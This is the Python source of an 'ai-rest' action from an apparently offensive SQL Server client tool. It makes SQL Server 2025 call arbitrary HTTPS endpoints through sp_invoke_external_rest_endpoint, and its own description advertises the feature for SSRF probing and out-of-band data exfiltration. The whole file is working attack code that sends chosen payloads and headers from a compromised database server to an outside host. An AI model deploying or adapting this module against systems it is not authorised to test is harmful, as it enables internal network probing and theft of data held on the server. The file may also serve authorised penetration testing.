# mssqlclient_ng/core/actions/remote/ai_rest.py

# Third-party imports
from loguru import logger

# Local imports
from ..base import Arg, BaseAction
from ..factory import ActionFactory
from ...services.database import DatabaseContext
from .ai_models import requires_sql2025

_METHODS = ("GET", "POST", "PUT", "PATCH", "DELETE")


@ActionFactory.register(
    "ai-rest",
    "Invoke an HTTPS endpoint via sp_invoke_external_rest_endpoint (SQL Server 2025). "
    "Use for SSRF probing or out-of-band data exfiltration.",
    aliases=["ssrf", "rest-probe"],
)
class AiRest(BaseAction):
    """
    Call sp_invoke_external_rest_endpoint, the native HTTPS REST client of
    SQL Server 2025. Useful for SSRF probing (internal services reachable by
    the SQL Server process) and out-of-band data exfiltration.

    Requires the 'external rest endpoint enabled' sp_configure option.
    HTTPS is mandatory; the server enforces TLS and a valid certificate chain.
    """

    _url = Arg(position=0, short_name="u", long_name="url", required=True,
               description="HTTPS URL to call (SQL Server enforces TLS)")
    _method = Arg(position=1, short_name="m", long_name="method", default="GET",
                  description="HTTP method: GET, POST, PUT, PATCH, DELETE (default: GET)")
    _payload = Arg(short_name="p", long_name="payload",
                   description="JSON payload for POST/PUT/PATCH requests")
    _headers = Arg(short_name="H", long_name="headers",
                   description='Additional HTTP headers as a JSON object, e.g. {"X-Api-Key":"secret"}')

    def validate_arguments(self, additional_arguments: str = "") -> None:
        self._bind_arguments(additional_arguments)

        if not self._url.lower().startswith("https://"):
            raise ValueError(
                "URL must use HTTPS. SQL Server 2025 only permits TLS for this feature."
            )

        self._method = str(self._method).upper()
        if self._method not in _METHODS:
            raise ValueError(
                f"Unsupported HTTP method '{self._method}'. Valid: {', '.join(_METHODS)}."
            )

    def build_query(self) -> str:
        """Build the batch; the trailing SELECT turns the OUTPUT parameter into a rowset."""
        def literal(value: str) -> str:
            return "N'" + value.replace("'", "''") + "'"

        optional = ""
        if self._headers:
            optional += f"\n    @headers = {literal(self._headers)},"
        if self._payload:
            optional += f"\n    @payload = {literal(self._payload)},"

        return (
            "DECLARE @resp NVARCHAR(MAX);\n"
            "EXEC sp_invoke_external_rest_endpoint\n"
            f"    @url = {literal(self._url)},\n"
            f"    @method = '{self._method}',{optional}\n"
            "    @response = @resp OUTPUT;\n"
            "SELECT @resp AS Response;"
        )

    def execute(self, database_context: DatabaseContext) -> str | None:
        qs = database_context.query_service
        if not qs.is_azure_sql and not requires_sql2025(database_context):
            return None

        logger.info(f"Invoking REST endpoint: [{self._method}] {self._url}")

        try:
            rows = database_context.query_service.execute_table(self.build_query())
        except Exception as ex:
            message = str(ex)
            if any(s in message for s in ("not enabled", "feature is not supported", "does not exist")):
                logger.error('Feature disabled. Enable with: config "external rest endpoint enabled" 1')
            elif any(s in message for s in ("certificate", "SSL", "TLS")):
                logger.error(f"TLS/certificate error: {message}")
            else:
                logger.error(f"REST call failed: {message}")
            return None

        response = rows[0].get("Response") if rows else None
        if response is None:
            logger.warning("No response returned")
            return None

        response = str(response)
        logger.success(f"Response received ({len(response)} bytes)")
        print()
        print(response)
        return response
